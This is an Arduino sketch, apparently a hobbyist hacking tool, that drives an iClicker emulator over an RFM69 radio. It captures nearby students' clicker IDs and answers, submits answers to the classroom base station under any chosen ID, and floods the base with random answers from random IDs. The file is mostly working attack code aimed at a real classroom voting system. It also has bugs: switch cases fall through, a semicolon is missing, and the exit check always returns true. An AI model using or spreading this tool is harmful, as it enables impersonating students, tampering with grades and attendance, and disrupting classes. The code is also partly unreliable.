#include "iClickerEmulator.h"
#include <RingBufCPP.h>
#include <string.h>

/* UPDATE THESE FOR YOUR PARTICULAR BOARD */
#define IS_RFM69HW false //make true if using w version
#define IRQ_PIN 3 // This is 3 on adafruit feather
#define CSN 8 // This is 8 on adafruit feather
/* END THINGS YOU MUST UPDATE */

#define MAX_BUFFERED_PACKETS 100

iClickerEmulator clicker(CSN, IRQ_PIN, digitalPinToInterrupt(IRQ_PIN), IS_RFM69HW);

RingBufCPP<iClickerPacket, MAX_BUFFERED_PACKETS> recvBuf;


// This will flood base station with random answers under random ids
// Use at your own risk...

void setup()
{
    Serial.begin(115200);
    clicker.begin(iClickerChannels::AA); //set channel to AA
    clicker.startPromiscuous(CHANNEL_SEND, recvPacketHandler);
    delay(1000);
    //clicker.dumpRegisters();
}


void loop()
{
    //while iclicker answers are coming in, deal with them
    iClickerPacket r;
    while (recvBuf.pull(&r) && r.type == PACKET_ANSWER){
        handleCapture(r.packet.answerPacket);
    }
    //after that check if the serial channel has any commands
    if (Serial.available() >= 8){
        char c = Serial.read();

        switch(c)
        {
            case 'a':
                send();
            case 'b':
                frequency();
            case 'c':
                ddos();
        }
    }

    delay(100);
}

//start ddosing the base, note that all other functionality is disabled while this is occurring
void ddos()
{
    for (int i = 0; i < 7; i++){
        Serial.read();
    }
    while (!shouldExit())
        clicker.ddos(1000);
    clicker.startPromiscuous(CHANNEL_SEND, recvPacketHandler);
}

//checks to see if the user has send a command to stop ddosing
bool shouldExit()
{
    if(Serial.available() >= 8){
        if(Serial.read() == 'd')
            for(int i = 0; i < 7; i++){
                Serial.read();
            }
            return true;
    }
    for(int i = 0; i < 7; i++){
                Serial.read();
    }
    return false;
}

//changes the frequency of the channel
void frequency(){
    char first = Serial.read();
    char second = Serial.read();
    iClickerChannel channel;
    switch(first)
    {
        case 'A':
            if (second == 'A'){
                channel = iClickerChannels::AA;
            }
            else if (second == 'B'){
                channel = iClickerChannels::AB;
            }
            else if (second == 'C'){
                channel = iClickerChannels::AC;
            }
            else if (second == 'D'){
                channel = iClickerChannels::AD;
            }
            else if (second == 'E'){
                channel = iClickerChannels::AE;
            }
            else if(second == 'F'){
                channel = iClickerChannels::AF;
            }
            break;
        case 'B':
            if (second == 'A'){
                channel = iClickerChannels::BA;
            }
            else if (second == 'B'){
                channel = iClickerChannels::BB;
            }
            else if (second == 'C'){
                channel = iClickerChannels::BC;
            }
            else if (second == 'D'){
                channel = iClickerChannels::BD;
            }
            else if (second == 'E'){
                channel = iClickerChannels::BE;
            }
            else if(second == 'F'){
                channel = iClickerChannels::BF;
            }
            break;
        case 'C':
            if (second == 'A'){
                channel = iClickerChannels::CA;
            }
            else if (second == 'B'){
                channel = iClickerChannels::CB;
            }
            else if (second == 'C'){
                channel = iClickerChannels::CC;
            }
            else if (second == 'D'){
                channel = iClickerChannels::CD;
            }
            else if (second == 'E'){
                channel = iClickerChannels::CE;
            }
            else if(second == 'F'){
                channel = iClickerChannels::CF;
            }
            break;
        case 'D':
            if (second == 'A'){
                channel = iClickerChannels::DA;
            }
            else if (second == 'B'){
                channel = iClickerChannels::DB;
            }
            else if (second == 'C'){
                channel = iClickerChannels::DC;
            }
            else if (second == 'D'){
                channel = iClickerChannels::DD;
            }
            else if (second == 'E'){
                channel = iClickerChannels::DE;
            }
            else if(second == 'F'){
                channel = iClickerChannels::DF;
            }
            break;
        case 'E':
            if (second == 'A'){
                channel = iClickerChannels::EA;
            }
            else if (second == 'B'){
                channel = iClickerChannels::EB;
            }
            else if (second == 'C'){
                channel = iClickerChannels::EC;
            }
            else if (second == 'D'){
                channel = iClickerChannels::ED;
            }
            else if (second == 'E'){
                channel = iClickerChannels::EE;
            }
            else if(second == 'F'){
                channel = iClickerChannels::EF;
            }
            break;
        case 'F':
            if (second == 'A'){
                channel = iClickerChannels::FA;
            }
            else if (second == 'B'){
                channel = iClickerChannels::FB;
            }
            else if (second == 'C'){
                channel = iClickerChannels::FC;
            }
            else if (second == 'D'){
                channel = iClickerChannels::FD;
            }
            else if (second == 'E'){
                channel = iClickerChannels::FE;
            }
            else if(second == 'F'){
                channel = iClickerChannels::FF;
            }
            break;
    }
    clicker.setChannel(channel);
    for (int i = 0; i < 5; i++){
        Serial.read()
    }

}

//capture packets that other iclickers have sent
void handleCapture(iClickerAnswerPacket answerPacket){
    char tmp[100];
    uint8_t *id = answerPacket.id;
    char answer = iClickerEmulator::answerChar(answerPacket.answer);
    updateRef(answerPacket);
    snprintf(tmp, sizeof(tmp), "%c:%02X %02X %02X %02X\n", answer, id[0], id[1], id[2], id[3]);
    Serial.println(tmp);
}


void recvPacketHandler(iClickerPacket *recvd)
{
    recvBuf.add(*recvd);
}

//send answer to base under a certain id
void send()
{
    char hexstr[4];
    uint8_t id[4];
    for (int i = 0; i < 4; i++){
        hexstr[i] = Serial.read();
        id[i] = (uint8_t)hexstr[i];
    }
    int ans_num = Serial.read();
    iClickerAnswer ans;
    if(ans_num == 0){
      ans = ANSWER_A;
    } else if(ans_num == 1){
      ans = ANSWER_B;
    } else if(ans_num == 2){
      ans = ANSWER_C;
    } else if(ans_num == 3){
      ans = ANSWER_D;
    } else if(ans_num == 4){
      ans = ANSWER_E;
    }
    clicker.submitAnswer(id, ans);
    for (int i = 0; i < 2; i++){
        Serial.read();
    }
}
